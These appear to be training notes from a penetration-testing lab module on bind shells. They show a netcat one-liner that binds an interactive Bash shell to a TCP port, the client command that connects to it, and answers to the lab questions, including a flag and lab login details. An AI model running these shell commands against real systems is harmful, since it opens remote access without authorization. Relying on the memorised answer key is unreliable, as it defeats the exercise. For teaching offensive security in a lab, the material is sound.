# Bind Shells
With a bind shell, the target system has a listener started and awaits a connection from a pentester's system (attack box).
## Establishing a Basic Bind Shell with Netcat
**No. 1: Server - Binding a Bash shell to the TCP session**
```
$ rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l 10.129.41.200 7777 > /tmp/f
```
**No. 2: Client - Connecting to bind shell on target**
```
$ nc -nv 10.129.41.200 7777

Target@server:~$  
```

## Questions
1. Des is able to issue the command `nc -lvnp 443` on a Linux target. What port will she need to connect to from her attack box to successfully establish a shell session? **Answer: 443**
2. SSH to the target, create a bind shell, then use netcat to connect to the target using the bind shell you set up. When you have completed the exercise, submit the contents of the `flag.txt` file located at `/customscripts`. **Answer: B1nD_Shells_r_cool**
   - `$ ssh htb-student@10.129.254.146`
   - `htb-student@ubuntu:~$ rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l 10.129.254.146 7777 > /tmp/f`: listen at port 7777 for a bind shell
   - `$ nc -nv 10.129.254.146 7777`: access the victim's shell from host